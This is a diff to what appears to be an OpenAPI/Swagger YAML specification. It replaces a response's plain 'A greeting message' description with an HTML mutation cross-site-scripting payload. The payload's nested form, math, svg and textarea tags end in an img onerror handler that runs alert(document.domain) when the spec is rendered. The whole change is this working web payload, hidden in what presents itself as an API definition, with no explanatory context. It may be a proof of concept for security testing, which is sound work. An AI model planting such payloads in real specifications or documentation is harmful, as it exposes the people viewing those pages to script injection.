@@ -15,7 +15,8 @@ paths:
           description: "The name of the user to greet"
       responses:
         200:
-          description: "A greeting message"
+          description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
           schema:
             type: "object"
             properties:
